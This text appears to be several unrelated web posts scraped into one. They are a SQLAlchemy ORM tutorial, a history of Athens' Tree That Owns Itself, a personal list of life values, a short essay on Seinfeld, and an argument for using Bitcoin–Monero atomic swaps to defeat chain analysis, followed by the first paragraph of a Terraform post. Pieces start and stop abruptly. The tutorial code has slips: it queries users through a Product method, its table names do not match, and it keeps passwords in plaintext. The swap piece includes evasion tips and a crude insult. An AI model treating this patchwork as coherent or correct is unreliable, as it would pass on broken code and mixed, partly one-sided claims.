<p>Since this post became surprisingly long, I decided that the main problem I was having with SQLAlchemy should be in a separated post. So, keep tuned :)</p>
<p>All code is available <a href="https://github.com/leportella/sqlalchemy-basics-post/">here</a>.</p>
<h2 id="creating-and-understanding-the-engine">Creating and understanding the Engine</h2>
<p>To start workin with SQLAlchemy, the first thing that they taught in the tutorials is to create an Engine. The Engine is how SQLAlchemy communicates with your database, so, when creating the Engine you should add your database (db) URL and that’s basically it.</p>
<p>Although we can access the db through Engine commands (we will see how), we usually don’t. You can, but you shouldn’t :)</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> create_engine

engine <span>=</span> create_engine(<span>'sqlite:///:memory:'</span>, echo<span>=</span>True)
</code></pre></div><p>So, you are just telling where your database currently is located. The attribute <code>echo=True</code> will make SQLAlchemy to log all SQL commands it is doing while you apply commands. This should not be activated in production, ok?</p>
<figure>
    <img src="https://i.imgur.com/0gVcCUg.png" width="200px"> 
</figure>

<p>Once your engine knows your database, it is easy to execute commands on it by using a method called <code>engine.execute(...)</code>. You can see how this is done here:</p>
<figure>
    <img src="https://raw.githubusercontent.com/leportella/sqlalchemy-basics-post/master/gifs/engine_execute.gif" width="450px"> 
</figure>

<p>So you have a two way street: the Engine that knows where your db is and a method (<code>engine.execute(...)</code>) to change the db using the Engine:</p>
<figure>
    <img src="https://i.imgur.com/yjdhaTZ.png" width="200px"> 
</figure>

<h2 id="engine-or-connection">Engine or connection?</h2>
<p>I also saw in some tutorials that you have another way of doing SQL commands through the <code>engine</code> by making a <code>connection</code> such as:</p>
<pre><code>conn = engine.connect()
conn.execute(...)
</code></pre><p>This allows us to create transaction commands, which means that all commands must be done successfully or all should rollback in case of an error [<a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/transactions-transact-sql?view=sql-server-2017">1</a>]:</p>
<div><pre><code data-lang="python">trans <span>=</span> conn<span>.</span>begin()
conn<span>.</span>execute(<span>'INSERT INTO "EX1" (name) '</span>
             <span>'VALUES ("Hello")'</span>)
trans<span>.</span>commit()
</code></pre></div><p>So, actually, the structure looks more like this now:</p>
<figure>
    <img src="https://i.imgur.com/Bcp1Zku.png" width="200px"> 
</figure>

<p>However, looking more deeply <a href="https://stackoverflow.com/a/34364247/3538098">some answers</a> about the differences between <code>engine.execute(...)</code> and <code>connection.execute(...)</code> I found that they are not different at all:</p>
<blockquote>
<p>“Using Engine.execute() and Connection.execute() is (almost) one the same thing, in formal, Connection object gets created implicitly, and in later case we explicitly instantiate it.’’</p>
</blockquote>
<p>So, feel free to use each one of those if you would like :)</p>
<h2 id="creating-and-understanding-sessions">Creating and understanding Sessions</h2>
<p>Until now we connected to our database and were able to execute commands through SQL statements. However, the thing that makes SQLAlchemy so attractive is its ORM, which was not discussed so far.</p>
<p>The ORM must have a <code>session</code> to make the middle-ground between the objects we will deal with in Python and the engine that actually communicates with the database. So, we need a function called <code>sessionmaker</code> that we’ll pass our engine to.</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy.orm <span>import</span> sessionmaker

Session <span>=</span> sessionmaker(bind<span>=</span>engine)
session <span>=</span> Session()
</code></pre></div><p>So, you will use sessions to talk to your tables and make queries, but is the <code>engine</code> that is actually implementing things on your db.</p>
<figure>
    <img src="https://i.imgur.com/iqV59ky.png" width="300px"> 
</figure>

<p>Although it seems confusing having three entities before even starting with our tables, most of the times after the initial setup you will use the <code>session</code> much more than the <code>engine</code> and <code>connection</code> will be done implicitly by the two firsts, ok?</p>
<h2 id="creating-tables">Creating tables</h2>
<p>Now we want to create tables in our db to work with them and finally start to take a look at SQLAlchemy’s ORM. To create new tables we will create classes that contain attributes. Each class will be a table in our db and each attribute will be a column in this table. To map which table in the db will be related to each class in our files, we will use a SQLAlchemy system called <em>Declarative</em>. To use this, the first thing we must do is to instantiate a <code>Base</code>:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy.ext.declarative <span>import</span> declarative_base

Base <span>=</span> declarative_base()
</code></pre></div><p>Now we create a class <code>User</code> that inherits from our <code>Base</code> declarative. We will create only three attributes to our class: <code>id</code> (which is a primary key and can’t be null), a name and a password. Since we are using <em>Declaratives</em>, we must add at least two attributes: 1) a <code>__tablename__</code> that how your table will be actually called inside the db and 2) at least one Column which is part of a primary key [<a href="https://docs.sqlalchemy.org/en/latest/orm/tutorial.html#declare-a-mapping">2</a>].</p>
<p>We will also add an optional method called <code>__repr__</code> that will be a string that will be returned when we see our user instance.</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String

<span>class</span> <span>User</span>(Base):
    __tablename__ <span>=</span> <span>'users'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
    password <span>=</span> Column(String)

    <span>def</span> __repr__(self):
        <span>return</span> f<span>'User {self.name}'</span>
</code></pre></div><p>We now have a class that indicates us how our table must be on our database. However, nothing is changed so far. To actually create the tables on our database, we will need the declarative <code>Base</code> we just created and the <code>engine</code>:</p>
<div><pre><code data-lang="python">Base<span>.</span>metadata<span>.</span>create_all(engine)
</code></pre></div><p>This is when SQLAlchemy will actually do something in our database. Since we have the variable <code>echo</code> set to <code>True</code>, we can see exactly which SQL statement the <code>engine</code> actually did on the database:</p>
<figure>
    <img src="https://i.imgur.com/kU4Snpb.png" width="400px"> 
</figure>

<h2 id="adding-new-records">Adding new records</h2>
<p>Now, we can use the class to create a new record on our database. We can user the <code>User</code> class to create a new user and <code>session.add(...)</code> to add the instance to our database.</p>
<div><pre><code data-lang="python">user <span>=</span> User(name<span>=</span><span>'John Snow'</span>, password<span>=</span><span>'johnspassword'</span>)
session<span>.</span>add(user)

<span>print</span>(user<span>.</span>id)  <span># None</span>
</code></pre></div><p>Now, even though we said we needed a primary key, I didn’t pass one for the model. And if I try to print the id of the user I just created, it will return <code>None</code>.</p>
<p>This is because <code>session.add</code> just register the transactions we want it to do, but it doesn’t actually do it [<a href="https://stackoverflow.com/a/4202016/3538098">3</a>].</p>
<p>As explained on <a href="https://stackoverflow.com/a/4202016/3538098">this link</a>, we have two operations that can be done here:</p>
<blockquote>
<p><code>session.flush()</code> communicates a series of operations to the database (insert, update, delete). The database maintains them as pending operations in a transaction. The changes aren’t persisted permanently to disk, or visible to other transactions until the database receives a COMMIT for the current transaction (which is what <code>session.commit()</code> does).</p>
</blockquote>
<p>or</p>
<blockquote>
<p><code>session.commit()</code> commits (persists) those changes to the database. <code>session.commit()</code> always calls for <code>session.flush()</code> as part of it.</p>
</blockquote>
<h2 id="making-queries">Making queries</h2>
<p>Once we have our records on our database, we need to be able to find them :)</p>
<p>So, to the <code>query</code> function of our <code>session</code> we will pass the class we want to look for our instance, an then use the method to filter by an attribute called <code>filter_by</code>.</p>
<div><pre><code data-lang="python">query <span>=</span> session<span>.</span>query(User)<span>.</span>filter_by(name<span>=</span><span>'John'</span>)
</code></pre></div><p>Finally, we pass a method to indicate what we want to do with this query: count the number of records found (<code>.count()</code>), return all records found (<code>.all()</code>), return the first record (<code>.first()</code>) and so on:</p>
<p>Another way is to use the <code>filter</code> method, instead of the <code>filter_by</code>, which has a slightly different syntax:</p>
<div><pre><code data-lang="python">session<span>.</span>query(User)<span>.</span>filter(User<span>.</span>name<span>==</span><span>'John'</span>)<span>.</span>first()
</code></pre></div><p>With <code>filter</code> method, you can also look for strings similar to what you have:</p>
<div><pre><code data-lang="python">session<span>.</span>query(User)<span>.</span>filter(User<span>.</span>name<span>.</span>like(<span>'%John%'</span>))<span>.</span>first()
</code></pre></div><p>On <a href="https://github.com/jupyterhub/jupyterhub">Jupyterhub</a> they added to each model a <em>classmethod</em> that would simplify this rather complicated syntax. We can add a method that you can pass a <code>session</code>, an attribute, and it returns all the elements, for instance:</p>
<div><pre><code data-lang="python"><span>class</span> <span>User</span>(Base):
  <span>...</span>

  <span>@classmethod</span>
  <span>def</span> <span>find_by_name</span>(cls, session, name):
    <span>return</span> session<span>.</span>query(cls)<span>.</span>filter_by(name<span>=</span>name)<span>.</span>all()
</code></pre></div><p>So, the new way to find all users named only ‘John’:</p>
<div><pre><code data-lang="python">Product<span>.</span>find_by_name(session, <span>'John'</span>)
</code></pre></div><h2 id="creating-new-tables-tables-after-initial-create_all">Creating new tables tables after initial create_all</h2>
<p>On problem I bump into while I was working with <a href="https://jupyter.org/">Project Jupyter</a> was that I needed to create a new table to a database and <code>engine</code> that already had a initial creation (the <code>Base.metadata.create_all(engine)</code>).</p>
<p>So, imagine that now I want a table with Products such as the following:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String

<span>class</span> <span>Product</span>(Base):
    __tablename__ <span>=</span> <span>'products'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
</code></pre></div><p>The simplest way I found to do this was simply:</p>
<div><pre><code data-lang="python">Product<span>.</span>__table__<span>.</span>create(engine)
</code></pre></div><h2 id="creating-a-foreign-key-relationship">Creating a Foreign Key relationship</h2>
<p>Imagine that you would like to connect each product to a user in your system. So, in each instance of <code>Product</code> you would like to store an instance of <code>User</code>:</p>
<figure>
    <img src="https://i.imgur.com/BJqWSMj.png" width="350px"> 
</figure>

<p>If you you are creating all tables now, you should add a Column on your <code>Product</code> class that references the Foreign Key of the user and a relationship with the <code>User</code> class:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, ForeignKey, Integer, String
<span>from</span> sqlalchemy.orm <span>import</span> relationship

<span>class</span> <span>Product</span>(Base):
    __tablename__ <span>=</span> <span>'product'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
    user_id <span>=</span> Column(Integer, ForeignKey(<span>'user.id'</span>))
    user <span>=</span> relationship(<span>'User'</span>)
</code></pre></div><p>And add a relationship between <code>User</code> and <code>Product</code> on <code>User</code> class:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String
<span>from</span> sqlalchemy.orm <span>import</span> relationship

<span>class</span> <span>User</span>(Base):
    __tablename__ <span>=</span> <span>'user'</span>  <span># if you use base it is obligatory</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)  <span># obligatory</span>
    name <span>=</span> Column(String)
    password <span>=</span> Column(String)
    products <span>=</span> relationship(Product, backref<span>=</span><span>"users"</span>)
</code></pre></div><p>Now you can create all tables by using the <code>Base.metada.create_all(engine)</code> we have seen previously.</p>
<p>Now, you can create a user and a product that are related with each other:</p>
<div><pre><code data-lang="python">user <span>=</span> User(name<span>=</span><span>'John'</span>)
product <span>=</span> Product(name<span>=</span><span>'wolf'</span>, user<span>=</span>user)

session<span>.</span>add_all([user, product])
session<span>.</span>commit()
</code></pre></div><p>And that’s it :)</p>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last friday added another count to the yearly event we celebrate as “birthday”. I can barely remember my last birthday, I’m not a big birthday celebration person. I think every day can be a celebration if you choose it to be and a yearly event is not sufficient reason to treat yourself.<br></p><p>The passage of time seems to have changed over the years. Things move by at light speed, and if I blink I miss it. It doesn’t feel like a lot happened, and yet if I sit down and think about my last 1 year, a LOT has happened.</p><p>As I was reminiscing, I went beyond the last 1 year and thought generally of the value system that governs my life. These things come “obviously” to me and they’ve made my life better. I hope these values can serve you as well.</p><h3>1. Fixed vs Growth mindset</h3><p>If you’re anything like me from a few years ago, whenever someone would tell you a way to improve yourself or your life, your default reaction would be “yeah yeah but my life is hard I have X Y and Z reasons why I cannot do something about it”. </p><p>That’s fixed mindset. It’s when your mind operates under the base assumption that you, your situation, your surroundings, and your abilities, everything is static and fixed.</p><p>On the opposite end of the same spectrum is Growth mindset. Here, your mind knows and believes that everything is a work in progress, everything can be changed, and the path to changing something about your life that you don’t completely like is a path of fulfilment, not pain that you want to ignore.</p><p>A fixed mindset plateaus. A person with growth mindset improves and grows, a tiny bit, everyday and forever. </p><h3>2. Complaining drags you down, think problem-solutions instead</h3><p>I could complain about all the problems in my life, or I could list them down, write their probable cause, probable solutions, and the gaps in my knowledge that I need to fill with research to better understand the problem and find better solutions.</p><p>The energy that is used in complaining can be applied towards finding solutions. Not only do you not feel like shit, solving a problem is a positive experience and gives you the sense of control over your life vs submitting to “my life is so hard and the universe is out to get me”.</p><p>Sankalp was watching Mirzapur and shared this with me last night - </p><p><em>“I was watching Mirzapur today. There was a scene where the dons primary gun factory is burnt down to the ground by his rival. </em></p><p><em>He arrives at the scene, calmly guages the situation, then calls the CM who is one of his allies and tells him to release a press statement that the govt has tracked down a gun factory run by a criminal org, burnt it and put all the perpetrators in jail thereby making the state a safer place for everyone and uplift the party's image.”</em><br></p><h3>3. 0 or 1, choices are binary</h3><p>Most of the things in life are an either or. You either got up early today, or you didn’t. You either hit the gym, or you didn’t. </p><p>You could spend a lot of time in analysis of the gray area in between, but it’s a wasted effort on aspects of your life that operate like a transistor.It’s either 0 or 1, switched off or on.</p><p>Identify binary choices in your life and make them swiftly.<br></p><h3>4. Everything is on a spectrum</h3><p>At the same time, a lot of things in life are indeed in the gray area. These don’t have easy choices with clear outcomes, and yet you have to identify the spectrum and decide where you want to be on it in order to move ahead.</p><p>Hitting the gym is binary, how intensely you work out is on a spectrum.</p><p>Choosing to start a business is binary, how risky a path you pick lies on a spectrum.<br></p><h3>5. via negativa. Addition by subtraction</h3><p>The solution to most problems is not to add something, but to remove.</p><p>Not able to lose weight? You can exercise more, or you could eat less. You don’t need to add a night time meditation routine, you only need to remove your laptop and phone from the room.</p><p>A lot of pain in life can be prevented by “avoiding” doing things.<br></p><h3>6. Inversion, or how not to do</h3><p>Here’s a simple mental model that can make your life easier to navigate. Instead of looking for “how to be a good boss”, invert the question. </p><p>Identify instead the reasons that come up when you research “how to be a bad boss”. Apply via negativa, by avoiding the attributes of a bad boss you already become a good one. </p><p>I did the same when I had taken up my last PM job, by making a list of “how to be a bad product manager” and then avoiding those things. </p><p>Sankalp and I did the same when we were hiring by researching “mistakes to avoid when hiring”.<br></p><h3>7. Common sense is not common practice</h3><p>You might think something is obvious and also common sense, but I’ve learnt that there’s a reason many things are tagged as “common sense”. The phrase is an attribute that is desirable, but not necessarily literal. </p><p>Everyone knows eating greasy food in the long term will cause heart disease. Or not hitting the gym or exercising will make your body old and creaky and unfit. It’s common sense. But, not common practice.</p><p>The most important things in life are the simple and obvious ones. And yet they are the hardest to keep following day in and day out. <br></p><h3>8. Time and energy are finite resources</h3><p>The only finite resource in your life is time and energy. And every day, you have a finite amount available to you to apply to various things. Choose carefully.<br></p><h3>9. Velocity, not speed</h3><p>I refer to this over the more commonly referred hard work vs smart work analogy.</p><p>You could be running at a 100 miles/hour but getting no where if you’re moving in circles. Speed. </p><p>Your direction, where you are headed, is more important. Only by moving in the right direction do you make real progress. Velocity.<br></p><h3>10. Treat others the way you would want to be treated</h3><p>Another of the common sense not common practice terms. It’s easy to complain about others when they treat you unfairly. Yet when the power dynamics are reversed, people often do the same treatment to others.</p><p>The real test is how you treat others when you are in a position of power.<br></p><h3>11. People don’t know what they really want</h3><p>Nobody really does. The pursuit of meaning can end with the sharp knife of nihilism. There is no meaning or purpose in life.</p><p>But while having these thoughts are crucial to self-discovery, they aren’t helpful to fixate upon.</p><p>So people create meaning, direction, structures around their life to add meaning and purpose.</p><p>Which is why I think nobody really knows what they want. It’s all made up anyway.<br></p><h3>12. Your health can’t wait</h3><p>The truth is, every day our bodies are getting slightly older.</p><p>And after 25 things start moving faster. I bet they move even faster after 30 or later. Save yourself the trouble and maintain your body from before.</p><p>It makes it that much easier to get out of bed every day, have the energy to do all the things you want during the day, and just generally feel good.<br></p><h3>13. What you eat is what your body becomes</h3><p>The food you eat literally becomes molecules in your body.</p><p>One of the simplest ways to maintain health is by focusing on your eating.</p><p>It’s fascinating to me that we eat 3-6 times/day, and yet very few people spend any time or mental bandwidth understanding food, nutrition and its role in how it shapes our body.</p><p>There are simple heuristics that can go a long way - eating fats doesn’t make you fat, sugar is a carb that affects your body similar to how alcohol does, fasting has marvellous effects on your body, the mantra for weight loss is calories in calories out, the mantra for muscle gain is reps and protein intake.<br></p><h3>14. The information you consume is what your mind becomes</h3><p>If the food you eat becomes your body, then the information you consume becomes your mind. Protect your mind as if it’s your most precious resource (it is), by filtering the sources of information that you let influence you. Even your Twitter feed is programming your subconscious without you realising it.<br></p><h3>15. How you think governs everything in your life</h3><p>If you really think about it, how you think governs your whole life.</p><p>What you eat, whether you exercise, who you date, how you treat relationships, how you learn something new, how you deal with adversity, how you treat others when you are in a position of power, how you spend your free time, how you build your business.</p><p>Everything steps from the root of your thought process, how you think.</p><p>I spent an insane amount of time in 2017-18 deliberately trying to understand my thought patterns, why I think and do the way I do, how do I actually want to be, what should I change and what should I double down upon.</p><p>You can try to do this by reading books, but the best answers will come through developing high self-awareness and doing deep self-introspection.<br></p><h3>16. Generalist skillset is a Swiss knife</h3><p>Over the past few years, I’ve followed a simple mantra to learn whatever hard or soft skills can improve my skill tree required to build successful businesses.</p><p>I visualise it like the skill tree in an RPG game. You can’t unlock and master all branches, so you have to be selective in nurturing the right set of skills.</p><p>Thanks to this mindset, I learnt how to think about product, learnt how to design, simple coding but more importantly understanding the fundamentals of tech, and now I’m learning to become a great marketer.</p><p>This Swiss Army knife is what helps me understand and imagine better ways to achieve the goals we have set to build DelightChat.</p><p>And this doesn’t just apply to entrepreneurs.</p><p>If you’re a designer, you need to understand product management and technology to understand how design fits in between.</p><p>If you’re a marketer, you need to know how to write copy or design creatives or build landing pages in addition to coming up with a marketing strategy.<br></p><h3>17. The real meta-skill is the ability to learn</h3><p>And during this journey I realised that the actual ability isn’t being able to design, or manage product, or write great copy. The real meta-skill is the ability to learn new skills as they become important in your journey. <br></p><h3>18. Don’t chase people, become valuable instead</h3><p>Whenever a friend asks me “How do I make her like me?” or similar question, my answer …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A couple of weeks ago, me and my team made a pact that each of us will write something every weekend. What we write about depends on what influenced the individual during that week that was worth sharing with the world.<br></p><p>As it turns out, my job is to write software and most of my time during the week is spent on solving technical challenges. Sometimes I can write about these challenges and how I solved them, but sometimes I can’t because we are too early in our journey of building <a href="https://www.delightchat.io/" target="_blank">delightchat.io</a> to be able to make our core architecture decisions public. <br></p><p>So what do I write this week that will help folks reading it learn something? Here is a radical thought - what if I write about something that doesn’t have any lesson at all? Does good content always need a theme and an underlying concept that helps somebody do something better?<br></p><h3><strong>Seinfeld - a show about nothing</strong><br></h3><p>For those who are not familiar, Seinfeld was a very popular sitcom that aired from the early 90s to the late 90s and it is generally referred to as “a show about nothing”. <br></p><p>This is only a half truth because Seinfeld is actually a very well written show with intricate plots that seem random at first but tie up pretty smoothly towards the end of an episode. The real reason it is a show about nothing is because unlike other sitcoms, the episodes do not have a theme. &nbsp;There is no lesson that the characters learn and evolve as human beings, there is no hidden metaphor that teaches you morals and values of how to navigate life.<br></p><p>The show instead focuses on whimsical scenarios that the characters face as a result of being selfish and inconsiderate. The episodes involve characters getting into conflicts during their day to day interactions with friends and family and how they handle the conflict while learning absolutely nothing in the process.<br></p><h3><strong>Why I think this is important</strong><br></h3><p>Despite everything you just read about Seinfeld, this was one of the most if not the most wildly successful sitcoms of all time and every sitcom since Seinfeld tries to embody some aspect of this in their plots. If not in the main plot there are sub plots which are about people screwing up and learning nothing. And this is for the simple reason that the show was very entertaining.<br></p><p>Sometimes all we really need in life is a creative way to pass the time. We are not in a race to constantly better ourselves, become the post possible version of ourselves, learn new things and kill it in life every single day. Some days are just slow and unproductive. And these days matter because otherwise how do we value the days where we do kill it in life?<br></p><p>We are fed this notion that everyone needs to chase a goal in life and every single day must be an attempt to get one step closer to that goal. For the record, I do think we should all have something that drives us and fuels the machine that keeps us going in life, but this doesn’t mean that the machine can’t rest and do nothing once in a while. <br></p><h3><strong>Life is long</strong><br></h3><p>The phrase “life is short” is quite popular. It is meant teach folks that every day must be lived to the fullest because we are all going to die someday and the last thing we want is to miss out on anything worthwhile.<br></p><p>But if you think about it, unless everyone has a terminal disease or gets into an accident, the average life expectancy of a person is over 70 years. This seems like a long time to be able to live life to the fullest every single day! <br></p><p>Life is long enough to waste a few days on doing nothing and let the brain and the body cool off and blow some steam. Life is long enough to let a few days pass without learning something new or accomplishing something. Life is long enough to waste time reading this article even though it doesn’t teach you anything.<br></p><h3><strong>Why did I write this article?</strong><br></h3><p>If you are still reading this despite me telling you that you will learn nothing from this, it means that you were most likely just browsing the internet while looking for nothing in particular. And that’s why I wrote this article - to help you pass the time and remind you that it is completely okay to do so.<br></p><p>If by any chance you are reading this while sipping your morning coffee or having a meal, or in general while performing a pretty uneventful task, I hope I kept you engaged. This is what Seinfeld did for me.</p></div></div>]]>

          <div><p>Monero cryptographers <a href="https://eprint.iacr.org/2020/1126.pdf" target="_blank" rel="noopener noreferrer">recently discovered</a> how to conduct “atomic swaps” between Bitcoin and Monero. This means that any two people can swap Bitcoin for Monero between them without relying on any third-party service, using only software they run themselves.</p><p>As Monero is the god of privacy coins (and the blockchain <a href="https://icryptonode.com/products/monero-icryptonode-raspberry-pi-device" target="_blank" rel="noopener noreferrer">we develop products for</a>), this naturally led to speculation that this innovation would enable Monero to become a layer-2 privacy solution for bitcoin, which is itself <a href="https://www.chainalysis.com/" target="_blank" rel="noopener noreferrer">notoriously traceable</a>.</p><p>Over the past week I have read all manner of incorrect information from uninformed commenters about if this is possible, how it will work, and what this means for Monero and Bitcoin.</p><p>Let me state clearly -</p></div>

<div><p>But it’s a Yes* (with an asterisk!). Let me explain:</p><p>Bitcoin is a public blockchain - the ledger is entirely open for analysis. This creates a perfect trail of transactions, allowing anyone to see the path of bitcoin from “freshly mined” to person A to B to C and so on. Bitcoin users who wish to maintain privacy have to do additional steps, such as using a mixing-wallet like <a href="https://www.wasabiwallet.io/" target="_blank" rel="noopener noreferrer">Wasabi</a>. Using Wasabi is an imperfect solution, has fees, and requires a relatively large amount of money to use. Another option is to trust a third-party like a centralized exchange. Either way, “breaking the chain” of bitcoin transactions to establish privacy is difficult, expensive, usually involves trusted third-parties, and is not guaranteed to maintain privacy forever as Chainalysis and similar firms become more sophisticated at tracing bitcoin transactions.</p><p>Bitcoin / Monero atomic swaps will establish privacy in a fully decentralized way - one that doesn’t rely on mixing technology or third-party trusted services. The way it will work is thus:</p><p>Alice currently owns bitcoin, but because of blockchain-analysis it’s trivial to know she purchased it at Coinbase. Fearing for her safety from an abusive ex-boyfriend, Chad, who works for the government and has access to Chainalysis software, it’s absolutely essential that Alice hides her bitcoin. Once Alice’s bitcoin is unlinked from her ownership, no one can prove she owns it, thus maintaining her personal safety.</p><p>Alice must do two trades - first, she swaps her bitcoin for an equivalent amount of Monero using an atomic swap and a counterparty she found in a decentralized exchange. She trades 1 BTC for 10 XMR.</p><p>Next, Alice swaps her XMR back to BTC. The market moved against her slightly - she now trades 10 XMR for 0.99 BTC, plus a small amount for network fees. Alice ends up with 0.9895 BTC.</p><p>Now, Alice has bitcoin that cannot be traced to her identity - she “broke the chain” that linked the purchase to her own identity. Alice never had to speak to anyone or trust any third-party service for doing so. She did work with two counterparties (trades from BTC to XMR and then XMR to BTC), but had no knowledge of who they were and never spoke with them, relying on software to conduct the swap peer-to-peer. She could not be scammed - provided she agreed with the trade amounts, it was mathematically impossible for her to lose her money at any step of the way - that’s why this is “trustless”.</p><p>Now, Alice has bitcoin she can save or spend anonymously. If she ever has a reason to anonymize more bitcoin, she can use the same steps to convert unsafe bitcoin to safe bitcoin, using the Monero blockchain as a privacy layer. Her wealth is now safe from Chad, the government rapist.</p></div>
<h2>Risks of Bitcoin to Monero Atomic Swaps</h2>
<div><p>As mentioned previously, <strong>Alice cannot be scammed using atomic swaps</strong>. Mathematics will perfectly protect her from a counterparty that tries to steal her money.</p><p>The biggest risk to Alice comes from <em>time</em> - the longer she waits, the less likely blockchain analysis will be able to track her, but the more likely the price will move against her.</p><p>Why is waiting important? Just like with <a href="https://tornado.cash/" target="_blank" rel="noopener noreferrer">tornado.cash</a>, if Alice were to quickly swap into XMR and back out into BTC, there will likely be few or no swaps other than her’s. This would make it probabilistically quite likely that the second BTC output is Alice’s. Alice should wait for several other swaps to occur before she executes her swap back into BTC.</p><p>Another risk is in the size of outputs. If Alice swaps 9.347 BTC into XMR, then swaps 9.347 back out, it’s highly likely it’s her’s.</p><p>Therefore, Alice should 1) Wait a while holding XMR (hours or days), and 2) make several, staggered transactions back into BTC from XMR. The biggest danger here is the price of Monero moving against Bitcoin, but it will likely be worth it to maintain privacy.</p><p>I anticipate that services will be created that make anonymizing Bitcoin simple and safe using standard output amounts (0.1, 1.0, 10.0 BTC, etc.) similar to tornado.cash.</p><p>One final note - I assume that chain-analysis can determine which bitcoin outputs are used for Monero atomic swaps. Given that the Bitcoin script used for the 2-of-2 Bitcoin locks is extremely specific, I assume that all Bitcoin UTXOs used for Monero swaps will be tracked. If Monero researchers find a way to obfuscate all atomic swap transactions among normal transactions, privacy can be greatly increased. But given the amount of intense research this solution will inevitably attract, it is unlikely “hiding among the crowd” will be possible. This is also why waiting after a swap will be extremely important.</p></div>
<h2>Conclusion</h2>
<p>Monero can indeed be used as a layer-2 privacy solution for Bitcoin. It is not perfect, and risks with timing and transaction size can compromise privacy. But Monero is currently the only trustless, fully-decentralized solution for enhancing privacy on Bitcoin and I anticipate that it will become extremely popular.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>I’ve been working at the internal platform team at Mercari for 3 years. In that team, we’ve developed and provided the special Terraform module, which bootstraps required infrastructure and SaaS services for building one microservice, to internal developers (See more details on <a href="https://speakerdeck.com/b4b4r07/terraform-ops-for-microservices">Terraform Ops for Microservices</a>). Now, this module is used by more than 400 services (since we create both development and production environments, actually it’s 800) and we’ve released the module more than 30 versions.</p>
